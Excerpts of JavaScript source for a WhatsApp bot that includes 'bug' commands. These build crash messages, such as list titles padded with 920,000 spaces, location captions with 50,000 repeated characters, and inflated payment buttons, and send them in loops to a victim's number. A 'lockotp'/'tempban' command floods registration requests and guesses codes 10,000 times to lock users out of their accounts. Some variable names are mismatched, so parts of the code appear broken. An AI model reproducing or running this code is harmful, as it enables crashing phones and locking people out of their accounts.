...
//bug database
const { errortext1 } = require('./50/errortext1')
const { errortext2 } = require('./50/errortext2')
const { errortext3 } = require('./50/errortext3')
const { errortext4 } = require('./50/errortext4')
const { errortext5 } = require('./50/errortext5')
const { errortext6 } = require('./50/errortext6')
const { errortext7 } = require('./50/errortext7')
const { errortext8 } = require('./50/errortext8')
const { errortext9 } = require('./50/errortext9')
const { errortext10 } = require('./50/errortext10')
const { errortext11 } = require('./50/errortext11')
const wkwk = fs.readFileSync(`./50/x.mp3`)
const xsteek = fs.readFileSync(`./50/x.webp`)
const o = fs.readFileSync(`./50/o.jpg`)
...
//autorep
const VoiceNoteError = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerError = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageError = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoError = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocError = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipError = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkError = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Africa/Cape town').format('HH:mm:ss')
        const xdate = moment.tz('Africa/Cape town').format('DD/MM/YYYY')
        const time2 = moment().tz('Africa/Cape town').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var errorytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var errorytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var errorytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var errorytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var errorytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var errorytimewisher = `Good Morning 🌄`
 } 
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"💀드림 가이 Error 💀드림 가이 Error 💀 드림 가이 Error\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function errorkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "💀드림 가이 Error",
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "💀드림 가이 Error"+" ".repeat(920000),
        'footerText': `💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error`,
        'description': `💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error 💀드림 가이 Error`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
message: {
"listResponseMessage": {
title: `Error's ur father`
}}
}
async function ErroryCrashy(dgerror,chat) {
GlobalTechInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgerror}.${errortext1}` ,
caption: `${dgerror + errortext1}`,
}, {quoted: subscribe_dgerror })
}
//end bug functions
...
for (let i = 0; i < errorlod.length; i++) {
await GlobalTechInc.sendMessage(from, {text: errorlod[i], edit: key });
}
}
        ...
        let errorrecordinfinal = errorrecordin[Math.floor(Math.random() * errorecordin.length)]
        GlobalTechInc.sendPresenceUpdate(errorecordinfinal, from)
...
let audiobuffy = fs.readFileSync(`./GlobalMedia/audio/${BhosdikaError}.mp3`)
GlobalTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaError of StickerError){
if (budy === BhosdikaError){
let stickerbuffy = fs.readFileSync(`./GlobalMedia/sticker/${BhosdikaError}.webp`)
GlobalTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaError of ImageError){
if (budy === BhosdikaError){
let imagebuffy = fs.readFileSync(`./GlobalMedia/image/${BhosdikaError}.jpg`)
GlobalTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaError of VideoError){
if (budy === BhosdikaError){
let videobuffy = fs.readFileSync(`./GlobalMedia/video/${BhosdikaError}.mp4`)
...
for (let BhosdikaError of ApkError) {
if (budy === BhosdikaError) {
let buffer = fs.readFileSync(`./GlobalMedia/apk/${BhosdikaError}.apk`)
sendapk(buffer)
}
}
...
for (let BhosdikaError of ZipError) {
if (budy === BhosdikaError) {
let buffer = fs.readFileSync(`./GlobalMedia/zip/${BhosdikaError}.zip`)
sendzip(buffer)
}
}
...
for (let BhosdikaError of DocError) {
if (budy === BhosdikaError) {
let buffer = fs.readFileSync(`./GlobalMedia/doc/${BhosdikaError}.pdf`)
senddocu(buffer)
}
}
...
`.trim()
                ...
                GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @KTError`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
            ...
            case 'donate':
            case 'donasi':
                let textnate = `Hello There${pushname}\n\nMind Following My Two Channels To keep me active 🤧`
                GlobalTechInc.sendMessage(m.chat, {
                    text: 'Channels: https://whatsapp.com/channel/0029VarLMN08aKvDTt0h9L3J  ,   https://whatsapp.com/channel/0029Vaf5x0eHFxP7JvSRRn1g\n\n' + textnate
                }, {
                    quoted: m
                })
                break
...
GlobalTechInc.sendMessage(from, { text : `Arise @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
...
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  async function errorBugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
...
let target = erroryvictim + '@s.whatsapp.net'
await replyglobal(`In process....`)
for (let j = 0; j < 1; j++) {
await listerrorfck(target, oneclickerror)
await locationerrory(target, force)
await errorkillpic(target, oneclickerror)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replyglobal(`Successfully Send Bug to ${erroryvictim} Using ${command}. ✅`)
}
break
case 'ioskill': case 'iosx': {
            	if (!isPremium) return replyglobal(mess.prem)
let erroryvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
await replyglobal(`In process....`)
let target = erroryvictim + '@s.whatsapp.net'
  for (;;) {
...
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "💀드림 가이 Error" + xeontext1,
    'mimetype': "application/zip",
    'caption': "💀드림 가이 Error" + xeontext1,
...
title: `Error's ur father`
			...
			async function ErroryCrashyIos(dgxeon, chat, participant) {
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `💀드림 가이 Error${xeontext11}`,
      caption: `💀드림 가이 Error ${xeontext11}`,
    },
    { quoted: { ...subscribe_dgerror, key: { ...subscribe_dgerror.key, participant } } }  // Includes the quoted participant
  );
}
  async function executeIosAttack() {
    if (!args[0]) amount = `99`;
    for (let i = 1; i < 10; i++) {
      ErroryCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
...
case 'lockotp': case 'tempban': {
  ...
  const errorCountryCode = args2[0];
  const xtarget = args2[1];
  const errorNumber = xtarget.replace('@s.whatsapp.net', '');
  const errormerge = `${xeonCountryCode}${xtarget}`
  const errorMention = errormerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + errorMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [errorMention]
  );
  try {
    const { stateError, saveCredsError } = await useMultiFileAuthState('./session');
    const xeonRequest = await GlobalTechInc.requestRegistrationCode({
      phoneNumber: '+' + errorCountryCode + `${errorNumber}`,
      phoneNumberCountryCode: errorCountryCode,
      phoneNumberNationalNumber: `${errorNumber}`,
  ...
  for (let i = 0; i < 10000; i++) {
    try {
      var errorPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await GlobalTechInc.register(`${errorPrefix}-${errorSuffix}`);
    } catch (err) {
      console.log(`${errorPrefix}-${errorSuffix}`);
    }
  }
}
break;
...
if (typemenu === 'v1') {
      ...
      renderLargerThumbnail: true
		...
		let errorresources = await Telesticker(args[0])
		await replyglobal(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && errorresources.length > 30) {
			await replyglobal('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < errorresources.length; i++) {
				GlobalTechInc.sendMessage(m.sender, { sticker: { url: errorresources[i].url }})
			}
		} else {
			for (let i = 0; i < errorresources.length; i++) {
				GlobalTechInc.sendMessage(m.chat, { sticker: { url: errorresources[i].url }})
			}
		}
